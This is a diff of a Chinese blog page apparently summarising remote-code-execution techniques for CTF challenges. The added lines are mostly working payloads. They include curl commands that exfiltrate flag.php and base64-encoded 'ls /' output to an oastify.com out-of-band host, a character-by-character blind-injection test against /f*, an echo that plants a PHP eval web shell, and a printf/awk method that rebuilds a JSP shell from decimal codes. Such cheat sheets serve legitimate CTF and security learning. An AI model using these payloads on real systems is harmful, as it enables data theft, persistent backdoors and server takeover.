@@ -283,7 +283,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">30分</span>
+        <span class="post-count">31分</span>
       </span>
     </span>
     
@@ -899,7 +899,9 @@ ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><
 <p><img src="/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/image-20250418091906523.png" alt="image-20250418091906523"></p>
 <p>利用burp中的Collaborator Client</p>
 <p>使用curl指令进行带外</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://k9u5p3u5hn9tl61hux77y81ad1jt7i.oastify.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-F</span> <span class="token assign-left variable">xx</span><span class="token operator">=</span>@flag.php  http://k9u5p3u5hn9tl61hux77y81ad1jt7i.oastify.com
+
+<span class="token function">curl</span> http://k9u5p3u5hn9tl61hux77y81ad1jt7i.oastify.com?a<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> / <span class="token operator">|</span> base64<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/image-20230717131213534.png" alt="image-20230717131213534"></p>
 <h3 id="写入文件并下载"><a href="#写入文件并下载" class="headerlink" title="写入文件并下载"></a>写入文件并下载</h3><blockquote>
@@ -909,7 +911,11 @@ ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> / <span class="token operator">|</span> <span class="token function">tee</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这样可以把<code>ls /</code>的结果输出写入1文件，然后就可以访问并下载</p>
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>脚本by <a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi">Kradress</a></p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cut</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> /f*<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span> <span class="token builtin class-name">echo</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>爆破匹配的字符即可</p>
+<p>时间盲注，脚本by <a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi">Kradress</a></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
 <span class="token comment">#-*- coding:utf-8 -*-</span>
 <span class="token comment">#__author__: 颖奇L'Amore www.gem-love.com</span>
@@ -948,6 +954,12 @@ result <span class="token operator">=</span> <span class="token string">''</span
 <li><code>sleep 5</code>：如果比较成功，则等待 5 秒钟。</li>
 </ul>
 <h3 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php eval(<span class="token variable">$_POST</span>['cmd']);?>"</span> <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>极限情况：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247497580&idx=1&sn=c77028340ad979d0182045d5796a3826&subscene=0">https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&amp;mid=2247497580&amp;idx=1&amp;sn=c77028340ad979d0182045d5796a3826&amp;subscene=0</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">printf</span> <span class="token string">"60<span class="token entity" title="\n">\n</span>37<span class="token entity" title="\n">\n</span>111<span class="token entity" title="\n">\n</span>117<span class="token entity" title="\n">\n</span>116<span class="token entity" title="\n">\n</span>46<span class="token entity" title="\n">\n</span>112<span class="token entity" title="\n">\n</span>114<span class="token entity" title="\n">\n</span>105<span class="token entity" title="\n">\n</span>110<span class="token entity" title="\n">\n</span>116<span class="token entity" title="\n">\n</span>40<span class="token entity" title="\n">\n</span>34<span class="token entity" title="\n">\n</span>49<span class="token entity" title="\n">\n</span>34<span class="token entity" title="\n">\n</span>41<span class="token entity" title="\n">\n</span>59<span class="token entity" title="\n">\n</span>37<span class="token entity" title="\n">\n</span>62<span class="token entity" title="\n">\n</span>"</span> <span class="token operator">></span> /xxxxx/1.txt
+<span class="token function">awk</span> <span class="token string">'&#123; printf "%c", $1 &#125;'</span> /xxxxx/1.txt <span class="token operator">></span> /xxxxx/1.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
 
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向</a></p>
